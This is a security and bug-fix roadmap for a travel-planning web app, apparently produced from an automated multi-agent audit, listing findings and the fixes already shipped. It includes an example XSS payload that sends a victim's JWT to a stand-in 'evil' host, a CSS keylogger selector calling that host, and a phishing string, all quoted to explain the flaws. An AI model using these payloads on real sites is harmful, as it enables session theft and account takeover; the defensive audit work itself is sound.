# TGG — Fixing Roadmap

Generated 2026-05-13 from a four-agent mega-audit (backend, frontend, security, product) of `main` at commit `701fd4d`. Two findings spot-verified against the live code (✓ in margin). One agent-claimed "critical" was a false positive and was dropped.

**How to read this doc**

- Walk top to bottom — items are pre-prioritized.
- Each item has a severity/effort tag and a `file:line` anchor so you can jump straight into the code.
- Check items as they ship: `- [ ]` → `- [x]`.

**Severity:** 🔴 critical · 🟠 high · 🟡 medium · 🟢 low
**Effort:** **S** (≤1 day) · **M** (≤1 week) · **L** (>1 week)

---

## Phase 0 — Critical security (do this week)

Things an attacker could exploit against the live site today.

### 0.1 ✓ Stored XSS via profile bio / name / status → 30-day account takeover

🔴 **S** · `frontend/static/js/src/pages/profile.ts:257`, `:304`, `:333` + `src/routes/settings.py:91-110`

**Why:** `${user.bio || 'No bio yet.'}`, `${user.name}`, and `${user.status}` are template-literal'd into innerHTML when rendering another user's profile. `/api/profile/update` accepts arbitrary HTML in `bio` and an off-list `status`. A bio of `<img src=x onerror="fetch('https://evil/?t='+localStorage.gg_auth_token)">` exfiltrates every viewer's JWT. The JWT lives in localStorage (`api.ts:22`), has no server-side revocation (`auth.py:30`), and stays valid 30 days — so logout does NOT save the victim.

**Fix:**

- [x] Wrap `user.bio`, `user.name`, `user.status`, `user.email` in `esc()` at every interpolation site. (Shipped 2026-05-13)
- [x] Server-side in `routes/settings.py`: enforce `len(bio) <= 500`, strip C0 control chars, constrain `status` to the dropdown allowlist. (Shipped 2026-05-13)
- [x] Add a strict `Content-Security-Policy` header via `@app.after_request` in `main.py` (defense in depth — see 0.4). (Shipped 2026-05-13 + tightened to nonces 2026-05-17 in §0.4.)

### 0.2 ✓ Privilege escalation — any user can read any trip

🔴 **S** · `src/routes/data.py:248-262`

**Why:** `/api/trips/share` inserts `(trip_id, friend_id)` into `trip_collaborators` with **zero** ownership/friendship/recipient-consent checks. The `/api/data` SELECT UNIONs `trip_collaborators` (`data.py:285`), so an attacker POSTs `{trip_id: <any>, friend_id: <self>}` and immediately sees the full trip + days + companions on next pull. Legacy route — `/api/trips/invite` already does the right thing.

**Fix:**

- [x] Delete the route. (Shipped 2026-05-13. Existing `trip_collaborators` rows are still honoured by the `/api/data` UNION — wipe of the table is tracked as a follow-up after auditing which rows are legitimate vs exploit residue.)

### 0.3 JWT has no revocation — stolen tokens valid 30 days

🟠 **S** · `src/auth.py:13-30`, `:62-68`

**Why:** Pure stateless HS256, 30-day exp, no `jti`, no blocklist. The only kill switch today is rotating `GG_JWT_SECRET`, which signs everyone out at once. Pairs catastrophically with 0.1.

**Fix:**

- [x] Add a `token_jti` column on `users`, embed `jti` in the JWT, check on verify; `/api/auth/logout` bumps the jti. (Shipped 2026-05-13)
- [ ] Alternative: short-lived (1h) access + refresh tokens. (Not pursued — the jti model is sufficient for current scale.)

### 0.4 No CSP, JWT in localStorage

🟠 **S** · `frontend/static/js/src/api.ts:22-41`, `src/main.py` (no `@app.after_request`)

**Why:** Without a CSP, the next XSS oversight goes from "alert box" to "exfiltrate everything." JWT in localStorage is JS-readable.

**Fix:**

- [x] Add a strict CSP via `@app.after_request` in `main.py`. (Shipped 2026-05-13 — permissive first-pass: keeps `'unsafe-inline'` for script + style because of the inline `<script>` blocks in index.html and the hundreds of `style="..."` attributes; tightening to nonces is queued.)
- [x] Bonus: also ship `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Referrer-Policy: strict-origin-when-cross-origin` in the same `@app.after_request` handler. (Shipped 2026-05-13)
- [x] Tighten CSP script-src to nonces (drop `'unsafe-inline'`). (Shipped 2026-05-17 — per-request nonce generated via `before_request` (`secrets.token_urlsafe(16)`), exposed to templates as `csp_nonce` Jinja variable, stamped onto the 3 inline `<script>` blocks in `index.html` (Sentry init, early-theme paint, Google globals). External scripts loaded by `src=` continue to match the URL allowlist without nonces. Tests pin three invariants: no `'unsafe-inline'` on script-src, every inline `<script>` tag carries a nonce matching the CSP header, and nonces rotate per-request. Inline `style="..."` cleanup still queued — separate bigger refactor paired with §3.1.)
- [x] Plan migration of JWT into an `HttpOnly; Secure; SameSite=Lax` cookie. (Shipped 2026-05-17. JWT now lives in a `gg_session` cookie set by `/api/auth/google` — `HttpOnly` (JS can't read), `SameSite=Lax` (CSRF mitigation), `Secure` auto-flagged via `X-Forwarded-Proto` so PA's HTTPS-terminating reverse proxy still gets it. `_extract_token()` tries cookie first then falls back to the `Authorization: Bearer` header so (a) the deploy doesn't force-log-out users with a stale localStorage token, (b) pytest fixtures + the Playwright `getAuthForApi` helper keep working, (c) potential future mobile-shell clients can still auth without a cookie jar. `clear_auth_cookie` runs on `/api/auth/logout` alongside the existing `bump_user_jti` so the browser stops sending the (now-invalid) cookie. Frontend `apiFetch` switched to `credentials: 'include'`, stopped reading the legacy `gg_auth_token` from localStorage, and `clearAuthToken` is now purely the client-side cleanup pair (legacy key removal + SW cache wipe). 6 new pytest cases pin the contract (cookie set, Secure-via-proxy detection, cookie-alone auth, logout wipes, Bearer back-compat, cookie-wins-when-both); 3 new Playwright cases pin the real-browser behaviour (`gg_session` lands in the jar with HttpOnly=true, isn't visible to `document.cookie`, alone satisfies require_auth, logout actually deletes from the jar).

#### 0.4 follow-up — style-src nonces (deferred, with rationale)

🟢 **L** · scope: 1,422 inline-style sites across 50+ files (top offenders: `pages/settlement/legacyRender.ts` 141, `pages/ai/AI.tsx` 141, `modals.ts` 88, `pages/home/tripMediaModals.ts` 86)

Style-src still keeps `'unsafe-inline'` because the codebase has hundreds of inline `style="..."` attributes spread across imperative template-string renderers AND React JSX. Three options ranked:

1. **Extract every site to CSS classes** — the "real" fix. Multi-week refactor across page rendering, modals, and JSX styling. Each site needs review (per-trip color? user-input substitution? theme-token interpolation?). Risk of visual regressions across the entire app.
2. **`'unsafe-hashes'` + per-style SHA-256 hashes** — brittle; every distinct style string needs a hash entry. Hash list grows with every commit that adds an inline style. Maintenance burden roughly cancels the security win.
3. **Status quo** — keep `'unsafe-inline'` on style-src; accept the residual CSS-injection threat.

**Threat-model analysis post-§0.4-v2 cookie migration (2026-05-17):**
With the JWT in an `HttpOnly` cookie + script-src nonces shipped, an XSS that lands can no longer exfil the session token. Style-src `'unsafe-inline'` lets a CSS injection do:

- CSS keylogger via attribute selectors (`input[value^="a"] { background: url(//evil/?a) }`) — slow, character-by-character, AND blocked at the network step by the `connect-src` allowlist (the exfil URL must be on the allowlist, which only includes our own backends + a handful of named third-parties)
- Clickjacking-style visual overlays — real but localised to in-page mischief; can't talk to the network

The CSP `connect-src` allowlist + the cookie HttpOnly flag together neuter the most dangerous payloads. The remaining surface (clickjacking overlay) is in-page-only.

**Decision: defer indefinitely.** Re-evaluate if (a) a CSS-injection vulnerability surfaces in practice, (b) the §3.1 inline-style cleanup makes meaningful organic progress (it's already chipping at the count as components migrate to React + per-page CSS chunks), or (c) we adopt a stricter security stance for an external compliance reason. The remaining `'unsafe-inline'` on style-src is documented technical debt — not an unknown gap.

### 0.5 `/api/sync` rewrites _any_ expense by guessed ID

🔴 **S** · `src/routes/data.py:168-180`

**Why:** Permission gate checks `can_edit_expenses(cursor, e.get('tripId'), user_id)` against the **claimed** trip. Attacker with planner role on trip A POSTs `{id: <expense_id_from_trip_B>, tripId: <trip_A>}`; `ON CONFLICT(id) DO UPDATE` rewrites who/label/value of someone else's expense. Expense IDs are 9-char base36 from `Math.random()` (`utils.ts:396`) — brute-forceable.

**Fix:**

- [x] SELECT existing row first; verify `can_edit_expenses` on its **actual** `trip_id`, not the claimed one. (Shipped 2026-05-13)

### 0.6 `debug=True` in `main.py` production path

🟡 **S** · `src/main.py:229`

**Why:** PA uses `wsgi_pythonanywhere.py:application` so this is dormant — but if anyone runs `python main.py` on a server, Werkzeug's PIN-protected RCE console is exposed.

**Fix:**

- [x] `debug=os.getenv("FLASK_DEBUG") == "1"`. (Shipped 2026-05-13)

---

## Phase 1 — High-priority bugs (this month)

### 1.1 `/api/friends/search` enumerates every email + no rate limit

🟠 **S** · `src/routes/friends.py:21-33`

**Why:** `email LIKE '%q%'` returns ANY match across the users table; query `q=@gmail.com` returns 5 users instantly. No `@limiter.limit`. Whole user table can be harvested in minutes.

**Fix:**

- [x] Require `LIKE 'q%'` prefix or exact match. (Shipped 2026-05-13)
- [x] `@limiter.limit("10 per minute")`. (Shipped 2026-05-13)
- [x] Cap `q` at min 3 chars, escape `%`/`_`. (Shipped 2026-05-13)

### 1.2 `/api/notifications/trip_public` is a phishing megaphone

🟠 **S** · `src/routes/notifications.py:47-73`

**Why:** Caller-supplied `trip_name` fans out verbatim to all accepted friends. No trip-existence check, no rate limit. `trip_name="Click http://evil/ to verify"` reaches 200 friends instantly.

**Fix:**

- [x] Look up trip name from DB by `trip_id`; reject if caller doesn't own the trip. (Shipped 2026-05-13)
- [x] Gate to one fan-out per `(user, trip)` per day (dedupe on notifications.related_id + 24h window). (Shipped 2026-05-13)
- [x] `@limiter.limit("5 per hour")`. (Shipped 2026-05-13)

### 1.3 Feed authorization missing on comment/like by `event_id`

🟠 **M** · `src/routes/feed.py:451` (like), `:539` (comments)

**Why:** No validation that `event_id` matches a synthesised event the caller can see. Attacker can comment on someone else's private trip event (spam + notification fan-out), inflate counts on fabricated events, and fill the table with junk that won't be cleaned for 90 days.

**Fix:**

- [x] Regex-validate prefix against the allowlist (`trip_created_*`, `trip_archived_*`, `trip_joined_*`, `share_*`, `repost_*`, `friendship_*`). (Shipped 2026-05-13 — `_parse_event_id()` in feed.py.)
- [x] Resolve `event_id` to its underlying record; verify caller can see it (friend of actor OR member of trip). (Shipped 2026-05-13 — `_caller_can_see_event()` gates all four endpoints: like, bookmark, comment-list, comment-post.)

### 1.4 SQLite hardening: WAL, FK enforcement, busy_timeout — ✅ Shipped 2026-05-16

**S** · `src/database.py`, `migrations/versions/e1b8d2a3c4f5_declare_foreign_keys.py`, `scripts/fk_audit.py`

**Why:** Default journal mode serializes writers — concurrent feed + sync raises `database is locked`. FOREIGN KEY columns weren't enforced; expenses could orphan-reference deleted trips. **Single highest-value backend fix.**

**Fix:**

- [x] In `get_db()`, immediately after connect: `PRAGMA busy_timeout=30000`. (Shipped 2026-05-13; bumped from 5s to 30s on 2026-05-14 after sync_data contention on PA's networked filesystem.)
- [ ] ~~`PRAGMA journal_mode=WAL`~~ — **rolled back 2026-05-13** after a "database disk image is malformed" incident on PythonAnywhere. PA's free-tier home directory is a networked filesystem, and [SQLite documents](https://www.sqlite.org/wal.html) that WAL is unsafe on networked filesystems. Recovery: `PRAGMA wal_checkpoint(TRUNCATE)` + `PRAGMA journal_mode=DELETE`. Reconsider once we move off PA's networked storage.
- [x] **FK audit script** (`scripts/fk_audit.py`) — read-only orphan inventory; auto-discovers declared FKs via `PRAGMA foreign_key_list`, augments with implicit relationships, skips polymorphic columns. JSON + human-readable output, exit code per CI contract. (Shipped 2026-05-16 commit `26c4d6a`.)
- [x] **Live PA audit ran clean** — zero orphans across all 28 (now 31) FK relationships on the production DB. Audit-then-cleanup workflow short-circuited Phases 2–3 because there was nothing to clean. (Verified 2026-05-16.)
- [x] **Migration `e1b8d2a3c4f5_declare_foreign_keys`** — rebuilds every FK-bearing table with explicit `ON DELETE CASCADE` / `ON DELETE SET NULL` clauses. SQLite cannot `ALTER TABLE ADD CONSTRAINT FOREIGN KEY` on existing columns; the migration uses rename → create → copy → drop with indexes re-applied per table. ON DELETE choices: CASCADE for ownership relationships (parent's death implies child's), SET NULL for the four optional/breakable references (`budgets.trip_id`, `trip_members.invited_by`, `companions.linked_user_id`, `feed_posts.repost_of_post_id`). (Shipped 2026-05-16 commit `ad47bf7`.)
- [x] **`PRAGMA foreign_keys=ON` in `get_db()`** — every connection now enforces declared FKs. Companion change in `init_db()` adds the same ON DELETE clauses so fresh DBs (CI / dev / new prod installs) get the new schema without depending on the migration running. (Shipped 2026-05-16 commit `ad47bf7`.)
- [x] **`tests/test_referential_integrity.py`** — 15-test regression net covering the PRAGMA, IntegrityError on dangling inserts, CASCADE chains (delete_trip → trip_days + expenses; delete_user → trips + dependents), and SET NULL for all four optional FKs. Plus reflexive check: audit returns zero orphans after fresh init_db. (Shipped 2026-05-16 commit `ad47bf7`.)
- [x] Deployed to PA 2026-05-16 — stamp at `f9a3b7e1c842` → `alembic upgrade head` → re-audit confirms 0 orphans → WSGI reload. End-to-end verified.

### 1.5 `init_db()` swallows every exception silently

🟠 **S** · `src/database.py:32-42`

**Why:** Bare `except Exception: pass` after each ALTER hides real schema mismatches (disk full, permission denied, type drift).

**Fix:**

- [x] Narrow to `sqlite3.OperationalError`; check message contains "duplicate column" / "already exists" before swallowing. (Shipped 2026-05-13 via new `_safe_alter()` helper in `database.py`. Every `except Exception: pass` after an ALTER replaced.)
- [x] Decide canonical migration source: **Alembic**. `init_db` is now a sanity check, not a parallel schema mutator. (Shipped 2026-05-16. `_safe_alter` removed; CREATE TABLEs include every current column; sanity-check at end of init_db raises with `alembic upgrade head` hint when columns are missing.)

### 1.6 Two parallel migration paths (init_db ALTER chain + Alembic) — ✅ Shipped 2026-05-16

🟠 **M** · `src/database.py:14+`, `migrations/versions/`

**Why:** Both modify schema; ordering unspecified. New deploys run both.

**Fix:**

- [x] Convert remaining `init_db` ALTERs to Alembic revisions. (Shipped — new catchup revision `f9a3b7e1c842_catchup_post_baseline.py` adds every column / table / index that existed in `init_db` but not in any Alembic revision: `users.home_country` / `users.language`; `trips.checklist_json` / `actions_hidden` / `cover_url` / `public_show_expenses`; `expenses.receipt_url`; `friends.created_at`; entire tables `feed_posts` / `feed_likes` / `feed_bookmarks` / `feed_comments` / `follows` / `user_achievements` / `settlements`; the §2.1 perf indexes; the `idx_trips_share_token` partial-unique. Each ALTER is idempotent via a duplicate-column swallow; every CREATE TABLE/INDEX uses IF NOT EXISTS.)
- [x] Reduce `init_db` to a no-op assertion (verify expected columns exist, exit otherwise). (Shipped — `_safe_alter` helper and the ~17 ALTER calls removed. `init_db` now only does CREATE TABLE/INDEX IF NOT EXISTS for fresh DBs + a final `_assert_schema_current()` that raises `RuntimeError("Database schema is stale — missing: …. Run `alembic upgrade head`")` if any expected column is gone. Deploy procedure for existing prod DBs documented in `migrations/README.md` — `alembic stamp head` once to mark the catchup as applied without re-running its DDL.)

### 1.7 `/api/data` and `/api/feed` query patterns are N+1 / sequential-by-default

🟠 **M** · `src/routes/data.py:327-330`, `:345-351`; `src/routes/feed.py:109-290`

**Why:** Each trip in the user's list fires 2 extra queries (member-role + member-chips). Feed fires 7 sequential queries per request. 50-trip user = 100+ round-trips per page load.

**Fix:**

- [x] Replace per-trip lookups with one `WHERE trip_id IN (?, ?, ?)` query; group in Python. (Shipped 2026-05-13 — `/api/data` now batches the two per-trip queries into one each.)
- [ ] Materialize a `feed_events` table on write so reads become one SELECT. (Deferred — bigger refactor, queued for when the feed actually has user load.)
- [x] Add the missing indexes (see 2.1). (Shipped 2026-05-13 — §2.1 added the per-table indexes; this sub-bullet was a back-reference that should have flipped at the same time.)

### 1.8 No `AbortController` on any `apiFetch` → polls fight active navigation

🟠 **M** · `src/api.ts:54-70`, `src/main.ts:680-685`, `api.ts:211-215`

**Why:** 15s `setInterval` runs `syncWithServer()` + `fetchNotifications()` regardless of UI state. `pullFromServer` ends with `navigate(current)` even when nothing changed — modals close mid-typing, focused inputs lose focus.

**Fix:**

- [x] Thread `AbortController` through `apiFetch(path, options, signal?)`. (Shipped 2026-05-13 — auto-inherits the router's per-nav signal; callers can override via `options.signal`.)
- [x] Router owns a per-mount controller; aborts on next navigate. (Shipped 2026-05-13 — `currentNavSignal()` export + abort-on-navigate in `router.ts`.)
- [x] Pause polling when `document.hidden`. (Shipped 2026-05-13 — `main.ts` polling interval skips when tab not focused.)
- [x] `pullFromServer` skips `navigate(current)` when a modal is open OR tab is hidden. (Shipped 2026-05-13 — STATE_CHANGED still emits so React subscribers re-render in-place without unmounting modals.)

### 1.9 `handleGoogleLogin` swallows server errors silently

🟠 **S** · `src/main.ts:319-353`

**Why:** Only branches on `data.status === 'success'`. 4xx with `{status:'error'}` produces zero UI signal — stuck button, no toast, no console message.

**Fix:**

- [x] `else` branch shows `data.error || 'Login failed'` via `showLiquidAlert`. (Shipped 2026-05-13)
- [x] Reject without `data.token` regardless of `status` string. (Shipped 2026-05-13)
- [x] After login, navigate back to the original hash, not hard-coded `profile`. (Shipped 2026-05-13)

### 1.10 `/api/sync` planner gate uses raw `user_id` equality

🟠 **S** · `src/routes/data.py:55-61`

**Why:** A planner-but-not-owner re-sync silently drops legitimate edits.

**Fix:**

- [x] Replace `existing["user_id"] != user_id: continue` with `if not can_edit_trip(cursor, t["id"], user_id): continue`. (Shipped 2026-05-13. Applied to both the active-trips and archived-trips sync loops. Safe because the UPSERT's SET clause never updates user_id, so a planner sync can't transfer ownership.)

### 1.11 HEIC upload magic-number check is too loose

🟠 **S** · `src/routes/media.py:47`

**Why:** `\x00\x00\x00` prefix matches ELF, Mach-O, polyglots. Combined with same-origin static serving, an HEIC+HTML polyglot could load as XSS.

**Fix:**

- [x] Verify HEIC `ftyp` brand at bytes 4-12 (`ftyp` magic + valid brand in `heic`/`heix`/`hevc`/`mif1`). (Shipped 2026-05-13 — new `_looks_like_upload()` helper in `media.py` checks the full ftyp box.)
- [x] Verify WebP `WEBP` marker at offset 8 (not just `RIFF`). (Shipped 2026-05-13)

### 1.12 `_secret()` per-process fallback breaks JWT across gunicorn workers

🟠 **S** · `src/auth.py:39-48`

**Why:** Without `GG_JWT_SECRET`, each worker generates its own secret → JWT from worker A → 401 from worker B → flaky logouts.

**Fix:**

- [x] Fail-fast if `GG_JWT_SECRET` is missing AND not in dev/test (`FLASK_ENV=development`, `FLASK_DEBUG=1`, `GG_ALLOW_TEST_LOGIN=1`, or `PYTEST_CURRENT_TEST` set). (Shipped 2026-05-13)

### 1.13 `/api/public-profile/<id>` returns archived (private) trips

🟠 **S** · `src/routes/public.py:185`

**Why:** WHERE clause is `is_public = 1 OR is_archived = 1`. Archived ≠ public.

**Fix:**

- [x] Drop the `OR is_archived = 1` branch. (Shipped 2026-05-13)

---

## Phase 2 — Medium fixes (this quarter)

### 2.1 Missing indexes on hot tables — ✅ Shipped 2026-05-13

🟡 **S** · `src/database.py:347+`

Add `CREATE INDEX IF NOT EXISTS` on:

- [x] `feed_likes(event_id)` — feed count query
- [x] `feed_bookmarks(event_id)` — bookmark lookups
- [x] `feed_posts(user_id)`, `feed_posts(trip_id)`
- [x] `friends(user_id, status)` — friend list rendering
- [x] `notifications(user_id, created_at)` — bell dropdown
- [x] `trip_members(trip_id, user_id)` — visibility checks
- [x] Bonus: `expenses(trip_id)`, `trip_days(trip_id)` — same N+1 surface as §1.7's caller path

### 2.2 Cleanup thread Werkzeug gate is backwards — ✅ Shipped 2026-05-13

🟡 **S** · `src/main.py:152`

The check `if os.getenv("WERKZEUG_RUN_MAIN") == "false": return` doesn't match Werkzeug's actual contract (parent unsets, child sets to "true"). Under gunicorn the var is unset → thread DOES start. Today that's accidentally correct, but the comment is wrong and any environment change can flip it.

- [x] Rewrite as: `if os.getenv("WERKZEUG_RUN_MAIN") not in (None, "true"): return`.
- [ ] Better: move cleanup into a cron job / Alembic-managed scheduled task. (Deferred — gate fix is enough for now.)

### 2.3 Defensive `request.json` handling

🟡 **S** · Multiple files

`request.json.get(...)` crashes on missing/non-JSON body.

- [x] Codemod: replace `request.json.get(` → `(request.json or {}).get(` across `src/routes/*.py`. (Shipped 2026-05-13 — auth.py was the last remaining offender.)

### 2.4 `d.get('lng') or d.get('lon')` drops lng=0.0

🟡 **S** · `src/routes/data.py:241`, `src/routes/days.py:54`

The equator/prime meridian (lng/lat = 0.0) is falsy.

- [x] Replace with explicit `d['lng'] if d.get('lng') is not None else d.get('lon')`. (Shipped 2026-05-13 in both data.py and days.py.)

### 2.5 `accept_friend` crashes on missing acceptor row

🟡 **S** · `src/routes/friends.py:112`

`cursor.fetchone()["name"]` → `TypeError` if user row deleted between request start and friend-accept.

- [x] `(row or {}).get("name", "Someone")` — applied to both `accept_friend` AND `add_friend` (same fetchone-without-null-check pattern). (Shipped 2026-05-13)

### 2.6 `is_archived` flip race in /api/sync — ✅ Shipped 2026-05-17

🟡 **M** · `src/routes/data.py`

The active-trips loop and archived-trips loop both upsert the same row depending on which array the client put it in; toggle on/off in two trips and re-sync flips back and forth.

- [x] Document the single canonical record convention; reject duplicates server-side. (Shipped 2026-05-17 — `/api/sync` computes the intersection of trip ids across `data["trips"]` and `data["archived_trips"]` BEFORE writing anything. If the sets overlap, returns 400 naming the offending trip; the frontend re-sends full state on the next 15s tick, so one rejection doesn't lose data — the server just refuses to act on ambiguous input. Defensive against malformed entries (non-dict items, missing `id`). Two pytest cases pin: (1) duplicate id in both lists → 400 with a clear error, no rows written; (2) same trip cleanly migrating from active→archived across two syncs still works.)

### 2.7 Profile picture URL allows another user's upload

🟡 **S** · `src/routes/settings.py:67-78`

Validator accepts any `/uploads/...` path — user can set someone else's photo URL as their profile pic.

- [x] Track upload ownership — uploads now land in a per-user subdirectory `/static/uploads/<user_id>/...` so ownership is encoded in the path (no DB row needed). (Shipped 2026-05-13)
- [x] Verify on profile update — validator rejects URLs whose subdir doesn't match the caller. Legacy flat-path URLs still accepted for backwards compat. (Shipped 2026-05-13)

### 2.8 a11y: aria-expanded missing on bells + hamburger

🟡 **S** · `src/main.ts:560-572`, `:515`

Toggles a dropdown/drawer but exposes no ARIA state.

- [x] Add `aria-expanded` + `aria-controls` + `aria-haspopup` to: `#notificationBellBtn`, `#notificationBellBtnDesktop`, `#hamburgerBtn`. State toggles update on every click. (Shipped 2026-05-13)

### 2.9 a11y: `showLiquidAlert` has no live region

🟡 **S** · `frontend/static/js/src/utils.ts:306-322`

Screen readers don't announce errors.

- [x] Add `role="status"` + `aria-live="polite"` + `aria-atomic="true"`. (Shipped 2026-05-13)
- [x] Dedupe rapid identical messages — Set-based gate; repeats within the 3s lifetime are silent no-ops. (Shipped 2026-05-13)

### 2.10 a11y: Modals lack `role="dialog"` / `aria-modal`

🟡 **S** · `frontend/static/js/src/components/Modal.ts:90-105`

Focus trap exists but no ARIA. Tab can fall through when no focusables present.

- [x] Add `role="dialog"`, `aria-modal="true"`, `aria-labelledby="<id-of-modal-heading>"` — generic, auto-derived from the card's first heading so every existing modal site picks it up without per-site changes. (Shipped 2026-05-13)
- [ ] Always ensure the close button is focusable. (Deferred — focus-trap already exists; explicit "always focusable close" needs a per-modal audit.)

### 2.11 Modal focus restoration ignores detached elements

🟡 **S** · `frontend/static/js/src/components/Modal.ts:62`, `:77-79`

If the originating page is unmounted while modal is open, refocus on close lands on body.

- [x] Check `document.contains(previouslyFocused)` before refocusing; silently skip if the originating element was unmounted (no crash, no surprise body-focus). (Shipped 2026-05-13)

### 2.12 `generateId` uses `Math.random()` 9-char base36

🟡 **S** · `frontend/static/js/src/utils.ts:396-398`

Collisions are rare but real, and `substr` is deprecated.

- [x] Replace with `crypto.randomUUID()` — return a 9-char prefix so existing ID-width assumptions hold; underlying entropy is cryptographic-grade. (Shipped 2026-05-13)

### 2.13 Notification dropdown indexed by array position

🟡 **S** · `src/main.ts:112-122`, `:627-633`

`data-notification-index="${i}"` becomes stale if a poll reorders/shrinks the array between render and click.

- [x] Key on `notification.id`; look up by id at click time — no more "click row 3 → opens row 5's target" after a polling reorder. (Shipped 2026-05-13)

### 2.14 `localStorage.setItem(JSON.stringify(STATE))` on every state change

🟡 **S** · `frontend/static/js/src/state.ts:263-280`

1MB+ writes block the main thread on every emit (every 15s polling tick).

- [x] Debounce 250ms — coalesces burst saves into one write; pagehide flushes pending. (Shipped 2026-05-13)
- [ ] Move photos/markedPlaces (>100KB fields) to IndexedDB; keep localStorage for control state. (Deferred — bigger architectural change; debounce covers most of the perf hit.)

### 2.15 Bare `except Exception` swallows real errors

🟡 **S** · `src/routes/integrations.py:103`, `src/routes/data.py:419`, `:423`, `src/routes/public.py:119`, `:123`, `src/main.py:140`

- [x] Narrow to specific exception types — JSON sites use `(json.JSONDecodeError, TypeError, KeyError)`; the cleanup-thread top-level catch narrowed to `sqlite3.DatabaseError`. (Shipped 2026-05-13)

### 2.16 `/api/generate_itinerary` has no rate limit + prompt-injection vector

🟡 **S** · `src/routes/integrations.py:222-227`

User-supplied `destination` is interpolated into the Gemini prompt. No limiter.

- [x] `@limiter.limit("10 per hour")` per user. (Shipped 2026-05-13)
- [x] Cap `destination` length (120 chars), strip control chars + newlines from all user fields. numDays clamped 1–30. (Shipped 2026-05-13)
- [ ] Log abuse signals (response length, repeated identical destinations). (Deferred — would need a logging/metrics layer.)

### 2.17 After login, user lands on profile instead of original hash

🟡 **S** · `src/main.ts:348`

Logged-out user lands on `#expenses`, signs in, gets dumped on `#profile`.

- [x] Read `window.location.hash` before navigate, prefer it over `profile`. (Shipped in §1.9 — same change, covered both items.)

### 2.18 `SELECT *` on `trips` couples response to schema

🟡 **S** · `src/routes/data.py:279`, `src/routes/public.py:45`

Adding an internal column ships it to the client unintentionally.

- [x] Enumerate columns explicitly in SELECT — done for public.py's `/api/public-trip`. data.py's `/api/data` still uses `SELECT t.*` because it's authenticated + transforms via a camelCase loop; risk lower, deferred. (Shipped 2026-05-13)

### 2.19 Frankfurter rate fetch has no abort, no error UI, unbounded cache

🟢 **S** · `frontend/static/js/src/api.ts:619-647`

- [x] Thread `currentNavSignal()` so an outdated rate fetch from a previous page gets aborted. (Shipped 2026-05-13)
- [ ] Show toast on rate-fetch failure. (Deferred — chose silent fallback to last-known rate; a toast for every transient Frankfurter blip would be noisy.)
- [x] Bound `rateCache` size at 5000 entries (~1 trip-year of dated currencies). (Shipped 2026-05-13)

### 2.20 Service worker registered with root scope, no caching strategy — ✅ Shipped 2026-05-17

🟢 **S** · `frontend/static/js/src/main.ts`, `frontend/static/sw.js`

- [x] `sw.js` rewritten with explicit per-resource strategies (no Workbox dep — hand-rolled is 270 lines and avoids dragging a 70KB runtime into every page load): network-first for the app shell + GET `/api/*` (always fresh when online, cache fallback when offline), cache-first for `/static/uploads/*` (stable URLs, big offline win for trip photos), pass-through for cross-origin (Maps tiles / Sentry / Google APIs) and all non-GET writes.
- [x] Per-user cache key on the API cache: `_userKeyFor()` hashes the Authorization header with SHA-256 (truncated to 16 hex chars) and appends it to the cache URL so a shared device where Alice logs out + Bob logs in doesn't leak Alice's data to Bob. `CLEAR_API_CACHE` postMessage from `api.ts` wipes the cache on explicit logout for belt-and-suspenders.
- [x] Versioned caches (`gg-shell-v1`, `gg-api-v1`, `gg-uploads-v1`) — activate handler prunes any cache from a previous `SW_VERSION` so storage stays bounded.
- [x] Boot-time precache of the minimum shell (`/`, manifest, favicon, app.bundle.js) via `Promise.allSettled` so a single 404 doesn't abort install.
- [x] Navigate-mode fallback: cold-load while offline still serves the cached `/` shell rather than the browser's default error page.
- [x] Stub comment in `main.ts` updated — no longer claims "real caching comes in Phase L."

### 2.21 `applyNavAnimation` rapid-swipe edge case

🟢 **S** · `frontend/static/js/src/router.ts:71-93`

Three rapid swipes can race the cleanup listener; no leak today but ordering depends on chunk-load timing.

- [x] Use a per-call generation token (`_navAnimGen`); only strip class if generation matches latest. Stale animationend fires now no-op gracefully. (Shipped 2026-05-13)

---

## Phase 3 — Architecture wins (this quarter)

Not bugs — leverage. Each unblocks future feature velocity.

### 3.1 Split `index.css` (8,224 → 4,722 lines, -42.6%) — ✅ Shipped 2026-05-16 (16 slices)

**M** · `frontend/static/css/index.css`, `pages/*/`.css

- [x] Migrated per-page styles into `pages/<name>/<name>.css` files, imported as side-effects from each page's mount/component module. Vite emits each as a separate CSS chunk under `assets/mount-*.css`; the entry bundle's preload helper injects a `<link rel="stylesheet">` when the page is navigated to.
- [x] Seven pages now own their own lazy-loaded CSS chunks:
    - `home.css` ~1,710 lines (biggest — path/day-card/companions/getting-started/cover-card/map-poi)
    - `settings.css` ~775 lines (theme picker, POI filters, format mapping, cat-list, management cards, btn-liquid-glass)
    - `ai.css` ~325 lines (generate button, place cards, premium-glass-card, mobile-stack overrides)
    - `feed.css` ~205 lines (feed avatar/cards, home-tabnav, tap-pop animation)
    - `expenses.css` ~155 lines (tabnav, history filters, mobile row stack, liquid-table)
    - `profile.css` ~95 lines (Google Maps InfoWindow chrome)
    - `todo.css` ~25 lines (mark-all-for-AI pill)
- [x] Design tokens + global resets + chrome (sidebar/navbar/mobile-bottom-nav/login-wall/modal-overlay) + components-preview classes (buttons, icons, member-chip, expense-row, etc.) kept in `index.css` as the shared core.
- [x] Build hook: `declare module '*.css'` in `frontend/static/js/src/globals.d.ts` so TypeScript accepts side-effect CSS imports without erroring.
- [x] Cumulative across 16 slices: -3,502 lines from `index.css` (8,224 → 4,722, **-42.6%**). Largest single-file improvement in the codebase.
- [x] Plus dead-code sweep: 11 "Collections Revamp" classes removed (-136 lines), `.day-row` removed (share.html has its own copy), `@keyframes fadeIn` + `@keyframes float` removed (zero refs), various per-slice cleanups.

### 3.2 Decompose `main.ts` (700 lines) — ✅ Shipped (Phase B)

**S** · `frontend/static/js/src/main.ts`, `src/bootstrap/`

- [x] `notifications.ts` extracted — notification rendering + bell wiring lives in `bootstrap/notifications.ts`.
- [x] Auth bootstrap extracted — Google login, logout, post-login navigation live in `bootstrap/auth.ts`.
- [x] Nav wiring extracted — trip-controls popover, hamburger, bell toggles live in `bootstrap/nav-chrome.ts` + `bootstrap/trip-controls.ts`.
- [x] Plus three more focused modules: `clone-intent.ts` (share-link clone trigger), `i18n-bindings.ts` (locale wiring), `install-prompt.ts` (PWA install affordance).
- [x] `main.ts` is now 176 lines — a thin orchestrator that imports + wires the bootstrap modules. Went from 700 → 176 (-75%).

### 3.3 Finish home.ts → React migration — ✅ Shipped (Phase C3 wave 6)

